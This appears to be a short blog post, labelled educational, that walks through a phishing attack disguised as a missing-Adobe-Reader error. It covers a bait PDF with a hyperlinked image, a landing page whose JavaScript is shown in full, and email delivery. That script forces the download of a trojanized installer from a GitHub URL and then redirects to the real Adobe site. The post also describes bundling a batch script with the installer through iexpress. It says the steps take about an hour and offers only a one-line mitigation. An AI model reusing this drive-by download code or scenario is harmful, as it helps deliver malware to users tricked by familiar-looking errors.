Adobe attack scenario

This is for educational purposes only.

The following scenario design was intending to build a business case. The scope was to work within the constraints of an advisary with limited resources and expertise.

In summary, the following scenario uses a malicious PDF to enable a 'driveby' download to deliver a trojanized installer of a standard and typically benign application. The principle is to use 'issue fatigue'. The concept of 'issue fatigue' is to take advantage of behaivoural traits within human nature. This attach can be built with four steps.

The error, I am sure we have all seen this -


Step one.

Quiet simple. This PDF is not an document requiring Adobe but it pretends like it does for the simple goal of directing the target to download a malicious file. THe idea is that this would be a common site in some workplaces and would hopefully be something the users has already come across - so it familar. Letting down their guard to something familar, and issue they have faced before - simply getting the right software.

Note: the file used in this example while modified should only execute an notification to provide value to the example.

Let start with the PDF. Here is a link to the template - which can be modified simply by opening in Word, creating a hyperlink from the image and than exporting to back to a .PDF. Here is the malicious .pdf I created for this scenario. Upon opening the PDF, the hope is that the user will click on the hyperlinked image which will redirect them to a website. This website is unique.

Step two.

The website, a simple index.html file is just that. Its main goal is to act and a landing page to force the download of a file and quickly redirect the user to a legitamite website. In this case, Adobe. The idea is to build merit for the payload - making it seem as geniune as possible.

The code within the landing page -

<head> <script> window.onload = function(){ var a = document.createElement("a"); a.href = "https://github.com/chrisjbawden/chrisjbawden.github.io/raw/master/blog/bin/adobe/readerdc64_en_xa_crd_install.exe"; a.download = true; a.click(); }; setTimeout(() => { window.location.href="https://get.adobe.com/reader/download/?installer=Reader_DC_2021.007.20099_English_Windows(64Bit)&os=Windows%2010&browser_type=KHTML&browser_dist=Chrome&dualoffer=false&mdualoffer=true&cr=false&stype=7771&d=McAfee_Security_Scan_Plus&d=McAfee_Safe_Connect"; }, 7000); </script> </head> <body> <p> </p> </body>
This brings us to the payload.

Step three.

The payload is a simple batch script and Adobe installation executable combined into a single executable. I used iexpress - obviously there would be better methodes to refine each step for better maturity but the focus was to invasion a low level threat.

Step four.

Delivery - this could be as simple as an email.

That's it. within an hour and access to hosting (like github) you can quickly create the scenario we discussed. With a little social engineering and refinement towards obfuscation for the payload, the successrate would improve. Mitigation - building positive behaivors of users when it comes to known issues and processes.
